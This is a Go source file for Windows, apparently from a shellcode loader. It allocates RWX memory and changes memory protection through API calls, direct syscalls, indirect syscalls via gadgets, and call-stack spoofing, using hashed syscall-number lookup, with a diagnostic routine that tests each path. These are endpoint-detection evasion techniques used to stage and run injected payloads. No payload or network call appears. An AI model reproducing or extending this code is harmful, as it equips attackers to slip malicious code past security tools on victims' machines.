//go:build windows

package win

import (
	"fmt"
	"syscall"
	"unsafe"
)

// InvokeMode mirrors the loader's invocation layers.
type InvokeMode string

const (
	InvokeAPI      InvokeMode = "api"
	InvokeDirect   InvokeMode = "syscall"
	InvokeIndirect InvokeMode = "indirect"
	InvokeSpoofed  InvokeMode = "spoofed"
)

// DiagSyscall exercises the syscall paths against a locally allocated region
// and reports what works (used to debug the direct/indirect syscall stubs on a
// real host). Diagnostics only.
func DiagSyscall() string {
	var out string

	// 0. Canary: resolve + call a 0-arg export via syscallN6 to prove the base
	// calling mechanism.
	if pidAddr, err := Resolve(ModuleKernel32(), "GetCurrentProcessId"); err == nil {
		r1, _, _ := syscallN(pidAddr, 0, 0, 0, 0, 0, 0)
		out += fmt.Sprintf("canary GetCurrentProcessId via syscallN6 = %d (err=%v)\n", r1, err)
	}
	if ntdll := ModuleNtdll(); ntdll != 0 {
		if tebAddr, err := Resolve(ntdll, "NtCurrentTeb"); err == nil {
			r1, _, _ := syscallN(tebAddr, 0, 0, 0, 0, 0, 0)
			out += fmt.Sprintf("canary NtCurrentTeb via syscallN6 = 0x%x\n", r1)
		} else {
			out += "canary NtCurrentTeb resolve failed\n"
		}
		// 1-arg pointer syscall: NtQuerySystemTime(LARGE_INTEGER*).
		if qst, err := Resolve(ntdll, "NtQuerySystemTime"); err == nil {
			var t int64
			r1, _, _ := syscallN(qst, uintptr(unsafe.Pointer(&t)), 0, 0, 0, 0, 0)
			out += fmt.Sprintf("canary NtQuerySystemTime via syscallN6 = st:0x%x t=%d\n", r1, t)
		} else {
			out += "canary NtQuerySystemTime resolve failed\n"
		}
	}

	// 0.5 Control: Go stdlib LazyProc call of NtAllocateVirtualMemory (5 args,
	// pointer args) — must succeed if the pointers/args are sane.
	if proc := syscall.NewLazyDLL("ntdll.dll").NewProc("NtAllocateVirtualMemory"); proc != nil {
		var cb uintptr
		sz := uintptr(4096)
		r1, _, e := proc.Call(^uintptr(0), uintptr(unsafe.Pointer(&cb)), uintptr(unsafe.Pointer(&sz)), 0x3000, 0x40)
		out += fmt.Sprintf("control LazyProc alloc: st=0x%x base=0x%x err=%v\n", r1, cb, e)
	}

	// 1. API path (L3): NtAllocateVirtualMemory via the resolved export.
	base, err := AllocateVirtualMemory(InvokeAPI, 4096, 0x40)
	out += fmt.Sprintf("api alloc: base=0x%x err=%v\n", base, err)

	// 2. Direct syscall (L4): 4-arg NtProtectVirtualMemory on the region.
	if base != 0 {
		addr := base
		size := uintptr(4096)
		var old uint32
		e, ok := SSN(HashNtProtectVirtualMemory)
		if ok {
			st := invokeDirect(e.SSN, ^uintptr(0), uintptr(unsafe.Pointer(&addr)),
				uintptr(unsafe.Pointer(&size)), 0x20, uintptr(unsafe.Pointer(&old)))
			out += fmt.Sprintf("direct protect(4arg): st=0x%x old=0x%x\n", uintptr(st), old)
		} else {
			out += "direct protect: SSN missing\n"
		}
	}

	// 3. Direct syscall (L4): 5-arg NtAllocateVirtualMemory.
	alloc2, err := AllocateVirtualMemory(InvokeDirect, 4096, 0x40)
	out += fmt.Sprintf("direct alloc(5arg): base=0x%x err=%v\n", alloc2, err)

	return out
}

// AllocateVirtualMemory reserves/commits RWX memory via NtAllocateVirtualMemory
// (ProcessHandle=-1, *BaseAddress, *RegionSize, AllocationType, Protect).
func AllocateVirtualMemory(mode InvokeMode, size uintptr, protect uint32) (uintptr, error) {
	var base uintptr
	regionSize := size

	switch mode {
	case InvokeAPI:
		proc, err := Resolve(ModuleNtdll(), "NtAllocateVirtualMemory")
		if err != nil {
			return 0, err
		}
		r1, _, _ := syscallN(proc, ^uintptr(0),
			uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&regionSize)),
			0x3000, uintptr(protect), 0)
		if NtStatus(r1).Success() {
			return base, nil
		}
		return 0, ntError(r1)
	case InvokeIndirect:
		e, ok := SSN(HashNtAllocateVirtualMemory)
		if !ok || e.gadget == 0 {
			return 0, errSSN
		}
		st := invokeIndirect(e.gadget, e.SSN, ^uintptr(0),
			uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&regionSize)),
			0x3000, uintptr(protect))
		if NtStatus(st).Success() {
			return base, nil
		}
		return 0, ntError(st)
	case InvokeSpoofed:
		e, ok := SSN(HashNtAllocateVirtualMemory)
		if !ok {
			return 0, errSSN
		}
		st := invokeSpoofed(e.SSN, ^uintptr(0),
			uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&regionSize)),
			0x3000, uintptr(protect))
		if NtStatus(st).Success() {
			return base, nil
		}
		return 0, ntError(st)
	default: // direct
		e, ok := SSN(HashNtAllocateVirtualMemory)
		if !ok {
			return 0, errSSN
		}
		st := invokeDirect(e.SSN, ^uintptr(0),
			uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&regionSize)),
			0x3000, uintptr(protect))
		if NtStatus(st).Success() {
			return base, nil
		}
		return 0, ntError(st)
	}
}

// ProtectVirtualMemory flips the protection of a region (4 args).
func ProtectVirtualMemory(mode InvokeMode, addr uintptr, size uintptr, protect uint32) (uint32, error) {
	var oldProtect uint32
	switch mode {
	case InvokeAPI:
		proc, err := Resolve(ModuleNtdll(), "NtProtectVirtualMemory")
		if err != nil {
			return 0, err
		}
		r1, _, _ := syscallN(proc, ^uintptr(0),
			uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&size)),
			uintptr(protect), uintptr(unsafe.Pointer(&oldProtect)), 0)
		if !NtStatus(r1).Success() {
			return 0, ntError(r1)
		}
	case InvokeIndirect:
		e, ok := SSN(HashNtProtectVirtualMemory)
		if !ok || e.gadget == 0 {
			return 0, errSSN
		}
		st := invokeIndirect(e.gadget, e.SSN, ^uintptr(0),
			uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&size)),
			uintptr(protect), uintptr(unsafe.Pointer(&oldProtect)))
		if !NtStatus(st).Success() {
			return 0, ntError(st)
		}
	case InvokeSpoofed:
		e, ok := SSN(HashNtProtectVirtualMemory)
		if !ok {
			return 0, errSSN
		}
		st := invokeSpoofed(e.SSN, ^uintptr(0),
			uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&size)),
			uintptr(protect), uintptr(unsafe.Pointer(&oldProtect)))
		if !NtStatus(st).Success() {
			return 0, ntError(st)
		}
	default:
		e, ok := SSN(HashNtProtectVirtualMemory)
		if !ok {
			return 0, errSSN
		}
		st := invokeDirect(e.SSN, ^uintptr(0),
			uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&size)),
			uintptr(protect), uintptr(unsafe.Pointer(&oldProtect)))
		if !NtStatus(st).Success() {
			return 0, ntError(st)
		}
	}
	return oldProtect, nil
}

// ntError wraps a failing NTSTATUS.
type ntError uintptr

func (e ntError) Error() string { return fmt.Sprintf("ntstatus 0x%x", uintptr(e)) }

// errSSN is a sentinel for an unresolved syscall number.
var errSSN = &ssnUnresolved{}

type ssnUnresolved struct{}

func (e *ssnUnresolved) Error() string { return "win: syscall number not resolved" }
